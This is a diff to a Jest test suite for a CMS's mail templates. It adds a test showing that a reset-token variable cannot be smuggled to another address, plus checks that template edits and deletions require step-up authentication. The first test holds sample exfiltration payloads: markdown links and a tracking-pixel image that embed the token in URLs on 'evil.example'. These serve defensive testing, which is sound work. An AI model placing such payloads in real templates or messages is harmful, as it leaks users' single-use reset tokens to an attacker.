@@ -181,6 +181,27 @@ describe('site mail', () => {
       expect(rendered.subject).not.toMatch(/[\r\n]/)
     })
 
+    it('never lets a template carry a variable to another address', () => {
+      const secret = 'https://example.com/reset?token=SINGLE-USE'
+      const rendered = renderMailTemplate(
+        {
+          subject: 'S',
+          body: [
+            '[wrapped](https://evil.example/?t={link})',
+            '![pixel](https://evil.example/p.gif?t={link})',
+            '[prefixed](https://evil.example/{link})',
+            '[whole]({link})',
+          ].join('\n\n'),
+        },
+        { link: secret },
+      )
+      // Only the address that IS the variable gets the value.
+      expect(rendered.html.match(/token=SINGLE-USE/g)).toHaveLength(1)
+      expect(rendered.html).toContain(`href="${secret}"`)
+      expect(rendered.html).not.toContain('evil.example/?t=https')
+      expect(rendered.html).not.toMatch(/src="[^"]*SINGLE-USE/)
+    })
+
     it('keeps a real link working and leaves unknown variables visible', () => {
       const rendered = renderMailTemplate(
         { subject: 'S', body: '[Confirm]({link}) {not.a.variable}' },
@@ -347,6 +368,11 @@ describe('site mail', () => {
 
     it('asks for step-up before adding or removing a connector or changing the defaults', async () => {
       const { cookie } = await h.createRoleUser({ name: 'Mailer', slug: 'mailer', capabilities: ['mail.manage'] })
+      const edit = await h.cms('/admin/api/cms/mail/templates/test.welcome', {
+        method: 'PUT', cookie, json: { subject: 'S', body: 'B' },
+      })
+      expect(edit.status).toBe(401)
+      expect((await h.cms('/admin/api/cms/mail/templates/test.welcome', { method: 'DELETE', cookie })).status).toBe(401)
       const add = await h.cms('/admin/api/cms/mail/connectors', { method: 'POST', cookie, json: SMTP })
       expect(add.status).toBe(401)
       expect((await readJson<{ error: string }>(add)).error).toBe('step_up_required')
